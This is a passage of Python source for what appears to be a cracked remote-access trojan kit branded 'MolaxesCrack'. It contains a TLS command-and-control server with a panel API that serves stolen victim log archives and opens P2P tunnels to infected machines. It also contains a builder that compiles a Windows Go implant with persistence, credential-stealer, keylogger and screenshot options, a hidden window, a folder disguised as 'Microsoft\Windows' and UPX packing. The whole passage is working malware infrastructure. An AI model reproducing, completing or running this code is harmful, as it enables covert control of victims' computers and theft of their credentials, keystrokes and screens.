                            hdr_part, body_part = chunk.split(b"\r\n\r\n", 1)
                            if body_part.endswith(b"\r\n"):
                                body_part = body_part[:-2]
                            hdr_str = hdr_part.decode("utf-8", errors="replace")
                            fname = ""
                            for hline in hdr_str.split("\r\n"):
                                if "filename=" in hline:
                                    for item in hline.split(";"):
                                        item = item.strip()
                                        if item.startswith('filename="'):
                                            fname = item[10:].rstrip('"')
                            if fname:
                                file_bytes = body_part
                                file_name  = fname
            uploads_dir = Path(__file__).parent / "uploads"
            uploads_dir.mkdir(exist_ok=True)
            safe_fname = "".join(c for c in file_name if c.isalnum() or c in "._-")[:64] or "file.exe"
            (uploads_dir / safe_fname).write_bytes(file_bytes)
            host_header = self.headers.get("Host", "127.0.0.1:8080")
            dl_url = f"http://{host_header}/uploads/{safe_fname}"
            log(f"[+] files/upload: saved {safe_fname} ({len(file_bytes)} bytes) -> {dl_url}")
            self._html_json(200, {"success": 1, "result": [dl_url, safe_fname]})
            return
        elif p.startswith("/connect"):
            connect_dir = Path(__file__).parent / "connect"
            connect_dir.mkdir(exist_ok=True)
            
            rel_path = p[len("/connect"):].lstrip("/")
            if not rel_path:
                rel_path = f"file_{int(time.time())}.bin"
            
            fpath = (connect_dir / rel_path).resolve()
            if not _inside(fpath, connect_dir):
                self._json(403, {"error": "forbidden"})
                return
            
            fpath.write_bytes(raw_body)
            self._json(200, {"success": True, "path": str(fpath)})
            return

        elif p == "/api/user/storage":
            self._json(200, {
                "success": True,
                "result": {
                    "used": 1048576 * 15,
                    "total": 1048576 * 1024 * 10
                }
            })
            return

        elif p == "/api/p2p/list":
            with p2p_lock, agents_lock:
                result = [dict(e) for e in p2p_store.values()]
            self._json(200, {"success": 1, "result": result})
            return

        elif p == "/api/p2p/add":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            hwid = str(params.get("hwid", [""])[0] or params.get("id", [""])[0] or "").strip()
            with agents_lock:
                a = agents.get(hwid)
                agent_ip = a.ip.rsplit(":", 1)[0] if a else "127.0.0.1"
            s = socket.socket()
            s.bind(("0.0.0.0", 0))
            free_port = s.getsockname()[1]
            s.close()
            token = gen_id()
            entry = {"token": token, "hwid": hwid,
                     "host": agent_ip, "victimport": free_port,
                     "type": str(params.get("type", ["1"])[0])}
            with p2p_lock:
                p2p_store[token] = entry
            log(f"[+] p2p/add hwid={hwid} -> {entry['host']}:{free_port} token={token}")
            self._json(200, {"success": 1, "result": entry})
            return

        elif p == "/api/p2p/remove":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            token = str(params.get("token", [""])[0])
            removed = False
            with p2p_lock:
                if token in p2p_store:
                    p2p_store.pop(token, None)
                    removed = True
            self._json(200, {"success": 1 if removed else 0})
            return

        elif p == "/api/logs/delete":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            uid = params.get("id", [""])[0] or params.get("hwid", [""])[0] or params.get("uid", [""])[0]
            uid = "".join(c for c in uid if c.isalnum() or c in "-_")[:64]
            zi = LOGS_DIR / f"{uid}.zip" if uid else None
            deleted = 0
            if zi and zi.exists():
                with contextlib.suppress(Exception):
                    zi.unlink()
                    deleted = 1
            self._json(200, {"success": 1 if deleted else 0})
            return

        elif p in ("/api/user/logout", "/api/user/logoutAll",
                   "/api/user/changePassword", "/api/user/addMail",
                   "/api/user/removeMail", "/api/user/addMailRequest",
                   "/api/user/removeMailRequest", "/api/user/2fa/add",
                   "/api/user/2fa/remove", "/api/user/removeAccount"):
            self._json(200, {"success": 1})
            return

        elif p in ("/api/logs/download", "/api/logs/get", "/api/logs/download/", "/api/logs/get/"):
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            uid = params.get("id", [""])[0] or params.get("hwid", [""])[0] or params.get("uid", [""])[0]
            uid = "".join(c for c in uid if c.isalnum() or c in "-_")[:64]
            log(f"[*] /api/logs/download -> uid={uid!r}")
            
            zip_path = LOGS_DIR / f"{uid}.zip" if uid else None
            
            if zip_path and zip_path.exists():
                body = zip_path.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f'attachment; filename="log_{uid}.zip"')
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(body)
                log(f"[*] /api/logs/download -> served {len(body)} bytes from disk for {uid}")
            else:
                body = b"log not collected"
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(body)
                log(f"[*] /api/logs/download -> no log for uid={uid!r}, sent 'not collected'")
            return

        elif p.startswith("/api/"):
            self._json(200, {"success": True, "result": []})
            return

        self._json(404, {"error": "not found"})


def log(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)


def run_server(host: str, port: int, api_addr: str):
    ensure_crypto()
    load_notify_store()
    load_builds_store()
    load_scripts_store()
    load_users_store()

    global rsa_priv_key, rsa_pub_pem

    rsa_priv_key = crypto_rsa.generate_private_key(public_exponent=65537, key_size=2048)
    rsa_pub_pem = rsa_priv_key.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    import hashlib
    fp = hashlib.sha256(rsa_pub_pem).hexdigest()[:16]
    log(f"[*] RSA pubkey fingerprint: {fp}")

    cert_pem, key_pem = gen_selfsigned_tls()
    with tempfile.NamedTemporaryFile(delete=False, suffix=".pem") as cf:
        cf.write(cert_pem)
        cert_file = cf.name
    with tempfile.NamedTemporaryFile(delete=False, suffix=".pem") as kf:
        kf.write(key_pem)
        key_file = kf.name

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert_file, key_file)

    api_host, api_port = api_addr.rsplit(":", 1)
    api_srv = ThreadingHTTPServer((api_host, int(api_port)), APIHandler)
    api_srv.c2_host = host
    api_srv.c2_port = port
    t = threading.Thread(target=api_srv.serve_forever, daemon=True)
    t.start()
    log(f"[*] Web panel:  http://{api_addr}")

    try:
        webbrowser.open("https://t.me/MolaxesCrack")
        webbrowser.open(f"http://{api_addr}")
    except Exception as e:
        log(f"[!] Browser open error: {e}")

    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_sock.bind((host, port))
    raw_sock.listen(64)
    log(f"[*] C2 TCP:     {host}:{port} (TLS)")

    try:
        while True:
            try:
                conn_raw, addr = raw_sock.accept()
                conn_tls = ctx.wrap_socket(conn_raw, server_side=True)
                threading.Thread(target=handle_conn, args=(conn_tls, addr), daemon=True).start()
            except Exception as e:
                log(f"[!] accept: {e}")
    finally:
        with contextlib.suppress(Exception):
            os.unlink(cert_file)
        with contextlib.suppress(Exception):
            os.unlink(key_file)


GO_VERSION = "1.26.0"
GO_URLS = {
    "windows": f"https://go.dev/dl/go{GO_VERSION}.windows-amd64.zip",
    "linux":   f"https://go.dev/dl/go{GO_VERSION}.linux-amd64.tar.gz",
    "darwin":  f"https://go.dev/dl/go{GO_VERSION}.darwin-amd64.tar.gz",
}


def find_or_install_go() -> str:
    suffix = ".exe" if platform.system() == "Windows" else ""

    zalypa_go = Path(__file__).parent / "zalypa" / "go" / "bin" / f"go{suffix}"
    if zalypa_go.exists():
        v = subprocess.check_output([str(zalypa_go), "version"], text=True).strip()
        print(f"[*] bundled go: {v}")
        return str(zalypa_go)

    go = shutil.which("go")
    if go:
        v = subprocess.check_output([go, "version"], text=True).strip()
        print(f"[*] found go in PATH: {v}")
        return go

    sdk_dir = Path(tempfile.gettempdir()) / "go_sdk"
    go_bin = sdk_dir / "go" / "bin" / f"go{suffix}"
    if go_bin.exists():
        print(f"[*] cached sdk: {go_bin}")
        return str(go_bin)

    zalypa_go_dir = Path(__file__).parent / "zalypa" / "go"
    zalypa_go_dir.mkdir(parents=True, exist_ok=True)
    system = platform.system().lower()
    url = GO_URLS.get(system, GO_URLS["linux"])
    ext = "zip" if system == "windows" else "tar.gz"
    archive = zalypa_go_dir / f"go.{ext}"

    print(f"[*] downloading Go {GO_VERSION}...")
    _download(url, archive)

    print("[*] extracting...")
    if ext == "zip":
        with zipfile.ZipFile(archive) as z:
            z.extractall(zalypa_go_dir)
    else:
        subprocess.check_call(["tar", "-xzf", str(archive), "-C", str(zalypa_go_dir)])
    archive.unlink(missing_ok=True)

    go_bin = zalypa_go_dir / "go" / "bin" / f"go{suffix}"
    if not go_bin.exists():
        raise FileNotFoundError(f"go binary missing: {go_bin}")

    v = subprocess.check_output([str(go_bin), "version"], text=True).strip()
    print(f"[+] ready: {v}")
    return str(go_bin)


def _download(url: str, dest: Path):
    with urllib.request.urlopen(url) as resp:
        total = int(resp.headers.get("Content-Length", 0))
        got = 0
        buf_size = 32 * 1024
        with open(dest, "wb") as f:
            while True:
                chunk = resp.read(buf_size)
                if not chunk:
                    break
                f.write(chunk)
                got += len(chunk)
                if total:
                    pct = got / total * 100
                    mb  = got / 1e6
                    tot_mb = total / 1e6
                    print(f"\r    {mb:.1f} / {tot_mb:.1f} MB ({pct:.0f}%)", end="", flush=True)
    print()


def run_builder(c2_host: str, c2_port: str, out_path: str, stub_dir: str, use_upx: bool, options: dict = None):
    if options is None:
        options = {}
    mutex_prefix = options.get("mutex_prefix", "letgob")
    persistence = "true" if options.get("persistence", True) else "false"
    stealer = "true" if options.get("stealer", True) else "false"
    keylogger = "true" if options.get("keylogger", True) else "false"
    screenshots = "true" if options.get("screenshots", True) else "false"
    folder_name = options.get("folder_name", "Microsoft\\Windows")

    print(f"[*] builder: host={c2_host} port={c2_port} out={out_path} persistence={persistence} stealer={stealer}")

    go_bin = find_or_install_go()

    if not stub_dir:
        stub_dir = str(Path(__file__).parent / "zalypa" / "stub")
    stub_dir = str(Path(stub_dir).resolve())
    if not Path(stub_dir).exists():
        raise FileNotFoundError(f"stub dir not found: {stub_dir}")
    print(f"[*] stub: {stub_dir}")

    out_abs = str(Path(out_path).resolve())
    ldflags = (
        f"-X main.c2Host={c2_host} "
        f"-X main.c2Port={c2_port} "
        f"-X main.mutexPrefix={mutex_prefix} "
        f"-X main.enablePersistence={persistence} "
        f"-X main.enableStealer={stealer} "
        f"-X main.enableKeylogger={keylogger} "
        f"-X main.enableScreenshots={screenshots} "
        f'-X "main.installFolderName={folder_name}" '
        f"-H windowsgui -s -w"
    )

    env = os.environ.copy()
    env["GOOS"]        = "windows"
    env["GOARCH"]      = "amd64"
    env["CGO_ENABLED"] = "0"

    cache_dir = Path(__file__).parent / "zalypa" / "gocache"
    cache_dir.mkdir(parents=True, exist_ok=True)
    env["GOCACHE"] = str(cache_dir.resolve())

    cpus = str(os.cpu_count() or 4)

    print("[*] building (fast parallel)...")
    result = subprocess.run(
        [go_bin, "build", f"-p={cpus}", "-buildvcs=false", "-ldflags", ldflags, "-trimpath", "-o", out_abs, "."],
        cwd=stub_dir, env=env,
    )
    if result.returncode != 0:
        raise RuntimeError(f"build failed (exit {result.returncode})")

    size = Path(out_abs).stat().st_size
    print(f"[+] built: {out_abs} ({size/1e6:.1f} MB)")

    if use_upx:
        upx = shutil.which("upx")
        if not upx:
            print("[!] upx not found in PATH (non-fatal), skipping")
        else:
            print("[*] packing UPX...")
            try:
                r = subprocess.run([upx, "--best", out_abs])
                if r.returncode == 0:
                    size = Path(out_abs).stat().st_size
                    print(f"[+] packed: {size/1e6:.1f} MB")
                else:
                    print("[!] UPX failed (non-fatal)")
            except Exception as e:
                print(f"[!] UPX error (non-fatal): {e}")

    print(f"\n[+] DONE: {out_abs}")


BANNER = r"""
t.me/MolaxesCrack
"""

def _input(prompt: str, default: str = "") -> str:
    try:
        val = input(prompt).strip()
        return val if val else default
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)


def prompt_and_run_server():
    os.system("cls" if platform.system() == "Windows" else "clear")
    print(BANNER)
    print()

    host = "0.0.0.0"
    port = _input("  TCP port   [31417]   > ", "31417")
    api  = "127.0.0.1:8080"
    print()
    run_server(host, int(port), api)


def main():
    if len(sys.argv) == 1:
        prompt_and_run_server()
        return

    p = argparse.ArgumentParser(prog="MolaxesCrack", add_help=False)
    p.add_argument("command", nargs="?", default="help")
    p.add_argument("--host",  default="127.0.0.1")
    p.add_argument("--port",  default="7777")
    p.add_argument("--api",   default="127.0.0.1:8080")
    p.add_argument("-h", "--help", action="store_true")
    args = p.parse_args()

    if args.help or args.command == "help":
        print(__doc__)
        return

    if args.command == "server":
        run_server(args.host, int(args.port), args.api)
    else:
        print(__doc__)


if __name__ == "__main__":
    main()